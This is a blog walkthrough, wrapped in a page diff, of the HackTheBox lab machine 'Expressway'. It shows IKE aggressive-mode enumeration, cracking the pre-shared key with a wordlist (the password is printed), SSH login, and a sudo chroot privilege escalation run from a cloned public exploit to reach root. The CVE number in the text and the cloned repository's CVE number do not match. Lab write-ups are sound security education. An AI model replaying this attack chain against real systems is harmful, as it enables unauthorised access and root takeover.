@@ -1,0 +1,593 @@
+<!DOCTYPE html><html lang="en-in"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HackTheBox Expressway Walkthrough - h4ck3rfirst</title><meta name="robots" content="noindex,nofollow"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta property="og:title" content="HackTheBox Expressway Walkthrough"><meta property="og:image" content="https://h4ck3rfirst.github.io/media/website/profile-2.png"><meta property="og:image:width" content="300"><meta property="og:image:height" content="300"><meta property="og:site_name" content="h4ck3rfirst"><meta property="og:description" content="Complete walkthrough of the HackTheBox Pentest Lab machine Expressway ┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway] └─$ rustscan -a 10.10.11.87 .----. .-. .-. .----..---. .----. .---."><meta property="og:url" content="https://h4ck3rfirst.github.io/hackthebox-expressway-walkthrough/"><meta property="og:type" content="article"><link rel="stylesheet" href="https://h4ck3rfirst.github.io/assets/css/style.css?v&#x3D;1caf1a6f5543014e342e13c53b1080b8"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://h4ck3rfirst.github.io/hackthebox-expressway-walkthrough/"},"headline":"HackTheBox Expressway Walkthrough","datePublished":"2025-09-21T18:18+05:30","dateModified":"2026-09-30T18:22+05:30","image":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300},"description":"Complete walkthrough of the HackTheBox Pentest Lab machine Expressway ┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway] └─$ rustscan -a 10.10.11.87 .----. .-. .-. .----..---. .----. .---.","author":{"@type":"Person","name":"h4ck3rfirst","url":"https://h4ck3rfirst.github.io/authors/h4ck3rfirst/"},"publisher":{"@type":"Organization","name":"h4ck3rfirst","logo":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300}}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript><style>@media (max-width: 600px) {
+    #publii-space-dust {
+        opacity: 0.85;
+    }
+}</style></head><body class="post-template"><div id="publii-space-dust" aria-hidden="true"><div id="publii-space-mouse-glow"></div></div><header class="top js-header"><a class="logo" href="https://h4ck3rfirst.github.io/"><img src="https://h4ck3rfirst.github.io/media/website/profile-2.png" alt="h4ck3rfirst" width="300" height="300"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://h4ck3rfirst.github.io/" target="_self" rel="https://h4ck3rfirst.github.io/">Home</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/" target="_self">CTF/Labs</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/" target="_self">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/" target="_self">Windows</a></li><li><a href="https://h4ck3rfirst.github.io/tags/learning/" target="_self">Learning</a></li><li><a href="https://h4ck3rfirst.github.io/about-me/" target="_self">About me</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero hero--noimage"><header class="hero__content"><div class="wrapper"><h1>HackTheBox Expressway Walkthrough</h1><div class="feed__meta content__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-09-21T18:18" class="feed__date">September 21, 2025</time></div></div></header></div><div class="entry-wrapper content__entry"><p>Complete walkthrough of the HackTheBox Pentest Lab machine <strong>Expressway</strong></p><h2 id="introduction">Introduction</h2><ul><li>Platform: HTB</li><li>Difficulty: Easy</li><li>Machine : Linux</li><li>Ip : 10.10.11.87</li><li>Objective: Get <code>user.txt</code> and <code>root.txt</code></li></ul><h2 id="nmap">nmap</h2><pre><code>┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway]
+└─$ rustscan -a 10.10.11.87
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-&#39; `-&#39;`-----&#39;`----&#39;  `-&#39;  `----&#39;  `---&#39; `-&#39;  `-&#39;`-&#39; `-&#39;
+The Modern Day Port Scanner.
+________________________________________
+: http://discord.skerritt.blog         :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Scanning ports: The virtual equivalent of knocking on doors.
+
+Open 10.10.11.87:22
+[~] Starting Script(s)
+[~] Starting Nmap 7.95 ( https://nmap.org ) 
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+
+┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway]
+└─$ rustscan -a 10.10.11.87 --udp
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-&#39; `-&#39;`-----&#39;`----&#39;  `-&#39;  `----&#39;  `---&#39; `-&#39;  `-&#39;`-&#39; `-&#39;
+The Modern Day Port Scanner.
+________________________________________
+: http://discord.skerritt.blog         :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+I scanned my computer so many times, it thinks we&#39;re dating.
+
+Open 10.10.11.87:500
+[~] Starting Script(s)
+
+PORT    STATE SERVICE
+500/udp open  isakmp
+</code></pre><p>What is ISAKMP?</p><p>ISAKMP (Internet Security Association and Key Management Protocol) is used by IKE to negotiate IPsec SAs. It listens on UDP/500, handling phase 1 negotiations (algorithm selection, key exchange). IKE responses allow enumeration of modes (Main/Aggressive) and identity material.</p><h2 id="ike-enumeration-ike-scan">IKE Enumeration: ike-scan</h2><p>Probed target in Main and Aggressive modes to identify a valid ID:</p><pre><code>┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway]
+└─$ ike-scan -M expressway.htb               
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.10.11.87     Main Mode Handshake returned
+        HDR=(CKY-R=dfebdfdb5ef41969)
+        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.335 seconds (2.98 hosts/sec).  1 returned handshake; 0 returned notify
+                                                                                                                                                                     
+┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway]
+└─$ ike-scan -A expressway.htb  
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=8cd968afc5c8395b) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
+
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.263 seconds (3.80 hosts/sec).  1 returned handshake; 0 returned notify
+</code></pre><p>Aggressive Mode revealed: <a href="mailto:&#105;&#x6b;&#101;&#x40;&#x65;&#x78;&#112;&#114;&#x65;&#x73;&#x73;&#x77;&#x61;&#x79;&#x2e;&#x68;&#116;&#x62;">&#105;&#x6b;&#101;&#x40;&#x65;&#x78;&#112;&#114;&#x65;&#x73;&#x73;&#x77;&#x61;&#x79;&#x2e;&#x68;&#116;&#x62;</a>. This mode exposes metadata, enabling PSK cracking.</p><pre><code>┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway]
+└─$ ike-scan -A --pskcrack=psk-hash.txt expressway.htb 
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=fb975395eb13bf98) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
+
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.133 seconds (7.49 hosts/sec).  1 returned handshake; 0 returned notify
+</code></pre><h2 id="psk-cracking">PSK Cracking</h2><p>Used wordlist attack with rockyou.txt:</p><pre><code>┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway]
+└─$ psk-crack -d /usr/share/wordlists/rockyou.txt psk.txt 
+Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
+Running in dictionary cracking mode
+key &quot;freakingrockstarontheroad&quot; matches SHA1 hash 3cc243d035aca0bf6926f2e2703e7ab6cec4a611
+Ending psk-crack: 8045040 iterations in 19.751 seconds (407319.75 iterations/sec)
+</code></pre><p>Found password: freakingrockstarontheroad</p><h3 id="initial-access--ssh-as-ike">Initial Access — SSH as ike</h3><p>With credentials, accessed SSH:</p><pre><code class="language-zsh">┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway]
+└─$ ssh ike@expressway.htb
+The authenticity of host &#39;expressway.htb (10.10.11.87)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;expressway.htb&#39; (ED25519) to the list of known hosts.
+ike@expressway.htb&#39;s password: 
+Last login: Wed Sep 17 10:26:26 BST 2025 from 10.10.14.77 on ssh
+Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Oct 12 18:17:12 2025 from 10.10.16.13
+
+
+
+ike@expressway:~$ ls
+user.txt
+</code></pre><h2 id="local-enumeration--privilege-escalation">Local Enumeration &amp; Privilege Escalation</h2><p>Ran linpeas for enumeration, but manual checks were needed for privilege escalation.found</p><pre><code class="language-zsh">╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                      
+strace Not Found                                                                                                                                                     
+-rwsr-xr-x 1 root root 1.5M Aug 14 12:58 /usr/sbin/exim4                                                                                                             
+-rwsr-xr-x 1 root root 1023K Aug 29 15:18 /usr/local/bin/sudo  ---&gt;  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 116K Aug 26 22:05 /usr/bin/passwd  ---&gt;  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 75K Sep  9 10:09 /usr/bin/mount  ---&gt;  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 87K Aug 26 22:05 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 91K Sep  9 10:09 /usr/bin/su
+-rwsr-xr-x 1 root root 276K Jun 27  2023 /usr/bin/sudo  ---&gt;  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 63K Sep  9 10:09 /usr/bin/umount  ---&gt;  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 70K Aug 26 22:05 /usr/bin/chfn  ---&gt;  SuSE_9.3/10
+-rwsr-xr-x 1 root root 52K Aug 26 22:05 /usr/bin/chsh
+-rwsr-xr-x 1 root root 19K Sep  9 10:09 /usr/bin/newgrp  ---&gt;  HP-UX_10.20
+-rwsr-xr-- 1 root messagebus 51K Mar  8  2025 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 483K Aug 10 00:07 /usr/lib/openssh/ssh-keysign
+-r-sr-xr-x 1 root root 14K Aug 28 09:04 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+-r-sr-xr-x 1 root root 15K Aug 28 09:04 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+</code></pre><p>Findings:</p><p>Exploited CVE-2025-32462 (sudo host-bypass) using the hostname:</p><p>Sudo Version match this CVE</p><pre><code class="language-zsh">ike@expressway:~$ sudo -V 
+Sudo version 1.9.17
+Sudoers policy plugin version 1.9.17
+Sudoers file grammar version 50
+Sudoers I/O plugin version 1.9.17
+Sudoers audit plugin version 1.9.17
+</code></pre><pre><code class="language-zsh">┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway]
+└─$ git clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git
+Cloning into &#39;CVE-2025-32463_chwoot&#39;...
+remote: Enumerating objects: 38, done.
+remote: Counting objects: 100% (38/38), done.
+remote: Compressing objects: 100% (34/34), done.
+remote: Total 38 (delta 20), reused 12 (delta 4), pack-reused 0 (from 0)
+Receiving objects: 100% (38/38), 11.43 KiB | 285.00 KiB/s, done.
+Resolving deltas: 100% (20/20), done.
+                                                                                 
+┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway]
+└─$ cd CVE-2025-32463_chwoot 
+</code></pre><p>We will trasfer to victim machine</p><pre><code class="language-zsh">┌──(kali㉿kali)-[/media/…/ctf/hackthebox/expressway/CVE-2025-32463_chwoot]
+└─$ scp sudo-chwoot.sh ike@expressway.htb:/tmp/
+ike@expressway.htb&#39;s password: 
+sudo-chwoot.sh                                 100% 1046     5.0KB/s   00:00    
+</code></pre><pre><code class="language-bash">└─$ ssh ike@expressway.htb 
+ike@expressway.htb&#39;s password: 
+Last login: on ssh
+Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun
+ike@expressway:~$ ls
+linpeas.sh  user.txt
+ike@expressway:~$ cd /tmp
+ike@expressway:/tmp$ ls
+sudo-chwoot.sh                                                                  systemd-private-077f5be3ebd641178aaf2578869d3b04-tftpd-hpa.service-d0E3W8
+systemd-private-077f5be3ebd641178aaf2578869d3b04-exim4.service-5JWSuR           vmware-root
+systemd-private-077f5be3ebd641178aaf2578869d3b04-systemd-logind.service-Ef4F4I  vmware-root_3585-2092249632
+ike@expressway:/tmp$ ./sudo-chwoot.sh 
+woot!
+root@expressway:/# ls
+bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
+root@expressway:/# cd /root/
+root@expressway:/root# ls
+root.txt
+</code></pre></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on September 30, 2026</p><div class="content__actions"><ul class="content__tag"><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/">CTF Writeups</a></li><li><a href="https://h4ck3rfirst.github.io/tags/cve-2025-32462/">CVE-2025-32462</a></li><li><a href="https://h4ck3rfirst.github.io/tags/easy/">Easy</a></li><li><a href="https://h4ck3rfirst.github.io/tags/expressway/">expressway</a></li><li><a href="https://h4ck3rfirst.github.io/tags/hackthebox/">hackthebox</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ikescan/">ikescan</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/rce/">rce</a></li><li><a href="https://h4ck3rfirst.github.io/tags/rockyoutxt/">rockyou.txt</a></li><li><a href="https://h4ck3rfirst.github.io/tags/sudo-v/">sudo -V</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-expressway-walkthrough%2F" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=HackTheBox%20Expressway%20Walkthrough&amp;url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-expressway-walkthrough%2F" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=HackTheBox%20Expressway%20Walkthrough https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-expressway-walkthrough%2F" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" rel="author">h4ck3rfirst</a></h3></div></div></div><nav class="content__nav"><div class="wrapper"><div class="content__nav-inner"><div class="content__nav-prev"><a href="https://h4ck3rfirst.github.io/hackthebox-soulmate-walkthrough/" class="content__nav-link" rel="prev"><figure class="content__nav-image"><img src="https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-xs.jpg" class="lazyload" loading="lazy" alt="" height="300" width="300"></figure><div><span>Previous</span> HackTheBox Soulmate Walkthrough</div></a></div><div class="content__nav-next"><a href="https://h4ck3rfirst.github.io/hackthebox-nocturnal-walkthrough/" class="content__nav-link" rel="next"><div><span>Next</span> HackTheBox Nocturnal Walkthrough</div></a></div></div></div></nav></footer></article><div class="content__related related"><div class="wrapper"><h2 class="h4 related__title">You should also read:</h2><article class="feed__item feed__item--centered"><figure class="feed__image related__image"><img src="https://h4ck3rfirst.github.io/media/posts/17/cheese.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/17/responsive/cheese-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/17/responsive/cheese-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/17/responsive/cheese-md.jpg 1024w" sizes="(min-width: 600px) calc(4.38vw + 143px), 87.86vw" loading="lazy" height="447" width="447" alt=""></figure><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-07-27T16:00" class="feed__date">July 27, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-cheese-walkthrough/">Tryhackme Cheese Walkthrough</a></h3></header><p>This is a write-up for the CheeseCTF Medium room on TryHackMe, which involves exploiting a vulnerable web application to escalate&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-06-14T18:39" class="feed__date">June 14, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-mr-robot-walkthrough/">Tryhackme Mr robot Walkthrough</a></h3></header><p>Welcome to the walkthrough of the Robot room on TryHackMe, inspired by the Mr. Robot TV series. This lab focuses&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-03-02T18:36" class="feed__date">March 2, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-lookup-walkthrough/">Tryhackme Lookup Walkthrough</a></h3></header><p>tags: [ctf, enumeration, exploit, Lookup, writeups, htb, writeups, tryhackme, Linux, wordpress, cracking, walkthrough] Welcome to the walkthrough for the Lookup&hellip;</p></div></article></div></div></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><h6>Documenting the world of bug bounties, pentesting, and security engineering one lab at a time.</h6><p class="align-center">© 2026 h4ck3rfirst . Built with 😊.</p></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://h4ck3rfirst.github.io/assets/js/scripts.min.js?v&#x3D;dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script><script>(function () {
+    "use strict";
+
+    const space = document.getElementById("publii-space-dust");
+
+    if (!space) return;
+
+    /* ================================
+       SETTINGS
+       ================================ */
+
+    const STAR_COUNT = 1200;
+
+    /*
+     * Approximately 2 cm on a typical desktop display.
+     * CSS pixels are not physically exact across monitors,
+     * so this is an approximate interaction radius.
+     */
+    const MOUSE_RADIUS = 75;
+
+    /* How fast the dust moves */
+    const MIN_SPEED = 0.99;
+    const MAX_SPEED = 2.99;
+
+    /* How often stars twinkle */
+    const MIN_TWINKLE = 0.9;
+    const MAX_TWINKLE = 2.8;
+
+    /* ================================
+       VARIABLES
+       ================================ */
+
+    const stars = [];
+    let mouseX = -9999;
+    let mouseY = -9999;
+    let animationFrame;
+
+    const glow = document.getElementById(
+        "publii-space-mouse-glow"
+    );
+
+    /* ================================
+       RANDOM HELPERS
+       ================================ */
+
+    function random(min, max) {
+        return Math.random() * (max - min) + min;
+    }
+
+    function clamp(value, min, max) {
+        return Math.max(min, Math.min(max, value));
+    }
+
+    /* ================================
+       CREATE STARS
+       ================================ */
+
+    for (let i = 0; i < STAR_COUNT; i++) {
+
+        const star = document.createElement("span");
+
+        star.className = "publii-star";
+
+        /*
+         * Most particles are tiny.
+         * A few are slightly larger.
+         */
+        const sizeChance = Math.random();
+
+        let size;
+
+        if (sizeChance > 0.992) {
+            size = random(3.0, 4.5);
+            star.classList.add("big");
+        } else if (sizeChance > 0.96) {
+            size = random(1.8, 3.2);
+        } else if (sizeChance > 0.82) {
+          // Normal stars
+    	size = random(1.0, 1.8);
+		} else {
+    	// Tiny space dust
+    	size = random(0.4, 1.1);
+		}
+
+        star.style.width = size + "px";
+        star.style.height = size + "px";
+
+        const x = Math.random() * window.innerWidth;
+        const y = Math.random() * window.innerHeight;
+
+        star.style.left = x + "px";
+        star.style.top = y + "px";
+
+        /*
+         * Each particle gets its own direction
+         * and speed so the background feels like dust.
+         */
+        const angle = random(0, Math.PI * 2);
+
+        const speed = random(
+            MIN_SPEED,
+            MAX_SPEED
+        );
+
+        /*
+         * Twinkle timing
+         */
+        const twinkleDuration = random(
+            MIN_TWINKLE,
+            MAX_TWINKLE
+        );
+
+        const twinkleDelay = random(
+            0,
+            MAX_TWINKLE
+        );
+
+        star.style.animation =
+            "publiiStarTwinkle " +
+            twinkleDuration +
+            "s ease-in-out " +
+            twinkleDelay +
+            "s infinite";
+
+        /*
+         * Store particle information.
+         */
+        stars.push({
+            element: star,
+
+            x: x,
+            y: y,
+
+            vx: Math.cos(angle) * speed,
+            vy: Math.sin(angle) * speed,
+
+            baseOpacity: random(0.25, 0.9),
+
+            size: size
+        });
+
+        space.appendChild(star);
+    }
+
+    /* ================================
+       ADD TWINKLE ANIMATION
+       ================================ */
+
+    const style = document.createElement("style");
+
+    style.textContent = `
+        @keyframes publiiStarTwinkle {
+            0%, 100% {
+                opacity: 0.08;
+            }
+
+            25% {
+                opacity: 0.35;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            75% {
+                opacity: 0.4;
+            }
+        }
+    `;
+
+    document.head.appendChild(style);
+
+    /* ================================
+       MOUSE
+       ================================ */
+
+    window.addEventListener(
+        "mousemove",
+        function (event) {
+
+            mouseX = event.clientX;
+            mouseY = event.clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /*
+     * Remove mouse interaction when
+     * pointer leaves the browser window.
+     */
+    document.addEventListener(
+        "mouseleave",
+        function () {
+            mouseX = -9999;
+            mouseY = -9999;
+        }
+    );
+
+    /* ================================
+       TOUCH
+       ================================ */
+
+    window.addEventListener(
+        "touchmove",
+        function (event) {
+
+            if (!event.touches.length) return;
+
+            mouseX = event.touches[0].clientX;
+            mouseY = event.touches[0].clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /* ================================
+       ANIMATION
+       ================================ */
+
+    function animate() {
+
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            /*
+             * Move dust
+             */
+            star.x += star.vx;
+            star.y += star.vy;
+
+            /*
+             * Wrap around screen edges
+             */
+            if (star.x < -10) {
+                star.x = width + 10;
+            }
+
+            if (star.x > width + 10) {
+                star.x = -10;
+            }
+
+            if (star.y < -10) {
+                star.y = height + 10;
+            }
+
+            if (star.y > height + 10) {
+                star.y = -10;
+            }
+
+            /*
+             * Move particle
+             */
+            star.element.style.transform =
+                "translate3d(" +
+                star.x +
+                "px," +
+                star.y +
+                "px,0)";
+        }
+
+        animationFrame = requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    /* ================================
+       MOUSE CONNECTIONS
+       ================================ */
+
+    /*
+     * Instead of permanently creating 800 lines,
+     * we create them only when needed.
+     */
+
+    let lastLineUpdate = 0;
+
+    function updateConnections(timestamp) {
+
+        /*
+         * Limit line calculations to about 30fps.
+         * This keeps 800 particles smooth.
+         */
+        if (timestamp - lastLineUpdate < 33) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        lastLineUpdate = timestamp;
+
+        /*
+         * Delete old connection lines.
+         */
+        const oldLines =
+            space.querySelectorAll(
+                ".publii-star-line"
+            );
+
+        oldLines.forEach(function (line) {
+            line.remove();
+        });
+
+        /*
+         * No mouse = no connections.
+         */
+        if (mouseX < 0 || mouseY < 0) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        /*
+         * Find stars close to mouse.
+         */
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            const dx = star.x - mouseX;
+            const dy = star.y - mouseY;
+
+            const distance =
+                Math.sqrt(dx * dx + dy * dy);
+
+            if (distance <= MOUSE_RADIUS) {
+
+                /*
+                 * Only connect fairly close stars
+                 * to the mouse.
+                 */
+                const line =
+                    document.createElement("span");
+
+                line.className =
+                    "publii-star-line";
+
+                const angle =
+                    Math.atan2(
+                        star.y - mouseY,
+                        star.x - mouseX
+                    ) * 180 / Math.PI;
+
+                line.style.left =
+                    mouseX + "px";
+
+                line.style.top =
+                    mouseY + "px";
+
+                line.style.width =
+                    distance + "px";
+
+                line.style.transform =
+                    "rotate(" + angle + "deg)";
+
+                /*
+                 * Closer = brighter.
+                 */
+                const opacity =
+                    1 - distance / MOUSE_RADIUS;
+
+                line.style.opacity =
+                    (opacity * 0.7).toFixed(2);
+
+                space.appendChild(line);
+            }
+        }
+
+        requestAnimationFrame(updateConnections);
+    }
+
+    requestAnimationFrame(updateConnections);
+
+    /* ================================
+       RESIZE
+       ================================ */
+
+    window.addEventListener(
+        "resize",
+        function () {
+
+            /*
+             * Keep stars inside the new viewport.
+             */
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+
+            stars.forEach(function (star) {
+
+                if (star.x > width) {
+                    star.x = Math.random() * width;
+                }
+
+                if (star.y > height) {
+                    star.y = Math.random() * height;
+                }
+            });
+        }
+    );
+
+    /* ================================
+       CLEANUP
+       ================================ */
+
+    window.addEventListener(
+        "pagehide",
+        function () {
+            cancelAnimationFrame(animationFrame);
+        }
+    );
+
+})();</script></body></html>
